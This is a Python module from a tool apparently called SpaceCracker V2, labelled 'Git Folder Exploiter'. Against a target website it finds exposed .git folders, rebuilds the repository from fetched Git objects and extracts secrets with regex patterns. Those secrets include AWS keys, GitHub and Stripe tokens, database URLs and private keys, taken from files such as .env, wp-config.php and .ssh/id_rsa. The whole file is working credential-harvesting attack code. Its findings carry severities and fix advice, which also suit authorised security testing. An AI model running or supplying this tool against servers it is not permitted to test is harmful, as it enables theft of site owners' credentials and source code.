#!/usr/bin/env python3
"""
SpaceCracker V2 - Enhanced Git Scanner
Advanced Git repository exposure scanner with object reconstruction and credential extraction
"""

import aiohttp
import asyncio
import os
import zlib
import hashlib
import re
from pathlib import Path
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin
from .base import BaseModule


class GitScanner(BaseModule):
    """Enhanced Git repository exposure scanner with reconstruction capabilities"""
    
    module_id = "git_scanner"
    name = "Git Folder Exploiter" 
    description = "Detect and exploit exposed Git metadata with repository reconstruction"
    supports_batch = True
    
    def __init__(self, config: Any = None):
        super().__init__(config)
        
        # Git files to check for exposure
        self.git_files = [
            '.git/HEAD',
            '.git/config',
            '.git/index',
            '.git/logs/HEAD',
            '.git/refs/heads/master',
            '.git/refs/heads/main',
            '.git/refs/heads/dev',
            '.git/refs/heads/develop',
            '.git/refs/remotes/origin/HEAD',
            '.git/refs/remotes/origin/master',
            '.git/refs/remotes/origin/main',
            '.git/packed-refs',
            '.git/description',
            '.git/info/refs',
            '.git/objects/info/packs'
        ]
        
        # Credential patterns to search for in reconstructed files
        self.credential_patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'[A-Za-z0-9/+=]{40}',
            'github_token': r'gh[pousr]_[a-zA-Z0-9]{36}',
            'sendgrid_key': r'SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}',
            'stripe_key': r'sk_(live|test)_[0-9a-zA-Z]{24,}',
            'mailgun_key': r'key-[0-9a-zA-Z]{32}',
            'database_url': r'(mysql|postgres|mongodb)://[^\s"\']+',
            'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
            'api_key': r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
            'private_key': r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
            'ssh_key': r'ssh-(rsa|dss|ed25519) [A-Za-z0-9+/]',
        }
        
        # Sensitive file patterns to prioritize during reconstruction
        self.sensitive_files = [
            '.env', '.env.local', '.env.production', '.env.staging',
            'config.json', 'config.yml', 'settings.json', 'secrets.json',
            'wp-config.php', 'database.php', 'configuration.php',
            '.aws/credentials', '.ssh/id_rsa', '.ssh/config',
            'docker-compose.yml', 'kubernetes.yaml', 'terraform.tfvars'
        ]
    
    
    async def run(self, target: str, config: Any, context: Dict[str, Any]) -> Dict[str, Any]:
        """Run enhanced Git scanner with reconstruction capabilities"""
        findings = []
        errors = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # 1. Check if .git folder is exposed
                git_exposure = await self._check_git_exposure(session, target)
                if not git_exposure['exposed']:
                    return {
                        "module": self.module_id,
                        "target": target,
                        "findings": findings,
                        "errors": errors
                    }
                
                findings.extend(git_exposure['findings'])
                
                # 2. If .git is exposed, attempt repository reconstruction
                if git_exposure['exposed']:
                    reconstruction_findings = await self._reconstruct_repository(session, target)
                    findings.extend(reconstruction_findings)
                    
                    # 3. Extract credentials from reconstructed content
                    credential_findings = await self._extract_git_credentials(session, target)
                    findings.extend(credential_findings)
                
        except Exception as e:
            errors.append(f"Git scanner error: {str(e)}")
        
        return {
            "module": self.module_id,
            "target": target,
            "findings": findings,
            "errors": errors
        }
    
    async def _check_git_exposure(self, session: aiohttp.ClientSession, target: str) -> Dict[str, Any]:
        """Check if .git folder is exposed and accessible"""
        result = {'exposed': False, 'findings': []}
        
        # Check .git/HEAD first as it's the most reliable indicator
        head_url = urljoin(target, '.git/HEAD')
        
        try:
            async with session.get(head_url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    if 'ref:' in content or content.strip().startswith('refs/'):
                        result['exposed'] = True
                        result['findings'].append({
                            "id": "git_folder_exposed",
                            "title": "Git Repository Exposed",
                            "severity": "Critical",
                            "category": "exposure",
                            "confidence": 1.0,
                            "description": "Git repository metadata is publicly accessible",
                            "evidence": {
                                "url": head_url,
                                "status_code": response.status,
                                "head_content": content.strip(),
                                "exposure_type": "git_metadata"
                            },
                            "recommendation": "Block access to .git directory and remove from web root"
                        })
                        
                        # Check additional Git files
                        for git_file in self.git_files:
                            file_findings = await self._check_git_file(session, target, git_file)
                            result['findings'].extend(file_findings)
                            
        except Exception as e:
            pass
        
        return result
    
    async def _check_git_file(self, session: aiohttp.ClientSession, target: str, git_file: str) -> List[Dict[str, Any]]:
        """Check specific Git file for exposure"""
        findings = []
        
        try:
            url = urljoin(target, git_file)
            async with session.get(url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    if self._validate_git_file(git_file, content):
                        severity = self._assess_git_severity(git_file)
                        
                        findings.append({
                            "id": f"git_file_exposed_{git_file.replace('/', '_').replace('.', '_')}",
                            "title": f"Git File Exposed: {git_file}",
                            "severity": severity,
                            "category": "exposure",
                            "confidence": 0.9,
                            "description": f"Git file {git_file} is publicly accessible",
                            "evidence": {
                                "url": url,
                                "status_code": response.status,
                                "content_length": len(content),
                                "content_preview": content[:200] if len(content) > 200 else content
                            }
                        })
                        
        except Exception as e:
            pass
        
        return findings
    
    async def _reconstruct_repository(self, session: aiohttp.ClientSession, target: str) -> List[Dict[str, Any]]:
        """Attempt to reconstruct repository from exposed .git objects"""
        findings = []
        
        try:
            # 1. Get HEAD to find current branch
            head_content = await self._fetch_git_file(session, target, '.git/HEAD')
            if not head_content:
                return findings
            
            current_ref = None
            if head_content.startswith('ref: '):
                current_ref = head_content[5:].strip()
            
            # 2. Get commit hash from current branch
            commit_hash = None
            if current_ref:
                ref_content = await self._fetch_git_file(session, target, f'.git/{current_ref}')
                if ref_content:
                    commit_hash = ref_content.strip()
            else:
                # HEAD contains commit hash directly
                commit_hash = head_content.strip()
            
            if commit_hash and len(commit_hash) == 40:
                # 3. Try to reconstruct files from commit
                reconstructed_files = await self._reconstruct_files_from_commit(session, target, commit_hash)
                
                if reconstructed_files:
                    findings.append({
                        "id": "git_repository_reconstructed",
                        "title": "Git Repository Successfully Reconstructed",
                        "severity": "Critical",
                        "category": "information_disclosure",
                        "confidence": 1.0,
                        "description": f"Successfully reconstructed {len(reconstructed_files)} files from Git objects",
                        "evidence": {
                            "commit_hash": commit_hash,
                            "current_branch": current_ref,
                            "reconstructed_files": list(reconstructed_files.keys())[:10],  # Limit to 10 for display
                            "total_files": len(reconstructed_files)
                        }
                    })
                    
                    # Check for sensitive files in reconstruction
                    for file_path, file_content in reconstructed_files.items():
                        if any(sensitive in file_path.lower() for sensitive in self.sensitive_files):
                            credentials = self._extract_credentials_from_content(file_content)
                            
                            findings.append({
                                "id": f"git_sensitive_file_reconstructed_{hashlib.md5(file_path.encode()).hexdigest()[:8]}",
                                "title": f"Sensitive File Reconstructed: {file_path}",
                                "severity": "Critical",
                                "category": "credential_exposure",
                                "confidence": 0.9,
                                "description": f"Reconstructed sensitive file {file_path} from Git objects",
                                "evidence": {
                                    "file_path": file_path,
                                    "file_size": len(file_content),
                                    "credentials_found": len(credentials),
                                    "content_preview": file_content[:500] if len(file_content) > 500 else file_content
                                }
                            })
                            
        except Exception as e:
            pass
        
        return findings
    
    async def _reconstruct_files_from_commit(self, session: aiohttp.ClientSession, target: str, commit_hash: str) -> Dict[str, str]:
        """Reconstruct files from a Git commit object"""
        reconstructed_files = {}
        
        try:
            # Get commit object
            commit_object = await self._fetch_git_object(session, target, commit_hash)
            if not commit_object:
                return reconstructed_files
            
            # Parse commit to get tree hash
            commit_lines = commit_object.split('\n')
            tree_hash = None
            for line in commit_lines:
                if line.startswith('tree '):
                    tree_hash = line.split(' ')[1]
                    break
            
            if tree_hash:
                # Recursively reconstruct files from tree
                await self._reconstruct_tree(session, target, tree_hash, '', reconstructed_files)
                
        except Exception as e:
            pass
        
        return reconstructed_files
    
    async def _reconstruct_tree(self, session: aiohttp.ClientSession, target: str, tree_hash: str, 
                               path_prefix: str, reconstructed_files: Dict[str, str]):
        """Recursively reconstruct files from Git tree objects"""
        try:
            tree_object = await self._fetch_git_object(session, target, tree_hash)
            if not tree_object:
                return
            
            # Parse tree object (simplified parsing)
            # Tree format: <mode> <name>\0<20-byte hash>
            i = 0
            while i < len(tree_object):
                # Find space separator
                space_pos = tree_object.find(b' ', i)
                if space_pos == -1:
                    break
                
                mode = tree_object[i:space_pos].decode('ascii')
                
                # Find null separator
                null_pos = tree_object.find(b'\0', space_pos)
                if null_pos == -1:
                    break
                
                name = tree_object[space_pos + 1:null_pos].decode('utf-8', errors='ignore')
                
                # Get 20-byte hash
                if null_pos + 20 >= len(tree_object):
                    break
                
                obj_hash = tree_object[null_pos + 1:null_pos + 21].hex()
                
                full_path = f"{path_prefix}{name}" if path_prefix else name
                
                if mode.startswith('100'):  # Regular file
                    # Fetch blob content
                    blob_content = await self._fetch_git_object(session, target, obj_hash)
                    if blob_content:
                        try:
                            reconstructed_files[full_path] = blob_content.decode('utf-8', errors='ignore')
                        except:
                            reconstructed_files[full_path] = '<binary_file>'
                            
                elif mode == '40000':  # Directory
                    # Recursively process subdirectory
                    await self._reconstruct_tree(session, target, obj_hash, f"{full_path}/", reconstructed_files)
                
                i = null_pos + 21
                
        except Exception as e:
            pass
    
    async def _fetch_git_object(self, session: aiohttp.ClientSession, target: str, obj_hash: str) -> Optional[bytes]:
        """Fetch and decompress Git object"""
        try:
            if len(obj_hash) != 40:
                return None
            
            # Git objects are stored as objects/xx/xxxxxx...
            obj_dir = obj_hash[:2]
            obj_file = obj_hash[2:]
            obj_path = f".git/objects/{obj_dir}/{obj_file}"
            
            obj_url = urljoin(target, obj_path)
            
            async with session.get(obj_url) as response:
                if response.status == 200:
                    compressed_data = await response.read()
                    
                    # Decompress zlib data
                    try:
                        decompressed = zlib.decompress(compressed_data)
                        # Remove object header (type + size + null byte)
                        null_pos = decompressed.find(b'\0')
                        if null_pos != -1:
                            return decompressed[null_pos + 1:]
                        return decompressed
                    except zlib.error:
                        return None
                        
        except Exception as e:
            pass
        
        return None
    
    async def _fetch_git_file(self, session: aiohttp.ClientSession, target: str, git_path: str) -> Optional[str]:
        """Fetch Git file content"""
        try:
            url = urljoin(target, git_path)
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.text()
        except Exception as e:
            pass
        
        return None
    
    async def _extract_git_credentials(self, session: aiohttp.ClientSession, target: str) -> List[Dict[str, Any]]:
        """Extract credentials from Git configuration and logs"""
        findings = []
        
        try:
            # Check .git/config for credentials
            config_content = await self._fetch_git_file(session, target, '.git/config')
            if config_content:
                credentials = self._extract_credentials_from_content(config_content)
                for cred in credentials:
                    findings.append({
                        "id": f"git_config_credential_{cred['type']}",
                        "title": f"Credential in Git Config: {cred['type']}",
                        "severity": "Critical",
                        "category": "credential_exposure",
                        "confidence": 0.9,
                        "description": f"Git configuration contains {cred['type']} credentials",
                        "evidence": {
                            "file": ".git/config",
                            "credential_type": cred['type'],
                            "context": cred.get('context', '')
                        }
                    })
            
            # Check .git/logs/HEAD for sensitive information
            logs_content = await self._fetch_git_file(session, target, '.git/logs/HEAD')
            if logs_content:
                if any(keyword in logs_content.lower() for keyword in ['password', 'secret', 'key', 'token']):
                    findings.append({
                        "id": "git_logs_sensitive_info",
                        "title": "Sensitive Information in Git Logs",
                        "severity": "Medium",
                        "category": "information_disclosure",
                        "confidence": 0.7,
                        "description": "Git logs may contain sensitive information",
                        "evidence": {
                            "file": ".git/logs/HEAD",
                            "content_preview": logs_content[:500]
                        }
                    })
                    
        except Exception as e:
            pass
        
        return findings
    
    def _validate_git_file(self, filename: str, content: str) -> bool:
        """Validate that content looks like a legitimate Git file"""
        if filename == '.git/HEAD':
            return content.startswith('ref:') or len(content.strip()) == 40
        elif filename == '.git/config':
            return '[core]' in content or '[remote' in content
        elif filename == '.git/index':
            return content.startswith('DIRC') or len(content) > 0
        elif '/refs/' in filename:
            return len(content.strip()) == 40
        elif 'logs/' in filename:
            return ' ' in content and len(content) > 20
        else:
            return len(content) > 0
    
    def _assess_git_severity(self, git_file: str) -> str:
        """Assess severity based on Git file type"""
        if git_file in ['.git/config', '.git/index']:
            return 'Critical'
        elif git_file in ['.git/HEAD', '.git/logs/HEAD']:
            return 'High'
        elif '/refs/' in git_file:
            return 'Medium'
        else:
            return 'Low'
    
    def _extract_credentials_from_content(self, content: str) -> List[Dict[str, Any]]:
        """Extract credentials from content using regex patterns"""
        credentials = []
        
        for cred_type, pattern in self.credential_patterns.items():
            matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                # Get context around the match
                start = max(0, match.start() - 50)
                end = min(len(content), match.end() + 50)
                context = content[start:end].replace('\n', ' ')
                
                credentials.append({
                    'type': cred_type,
                    'value': match.group(0),
                    'context': context,
                    'position': match.start()
                })
        
        return credentials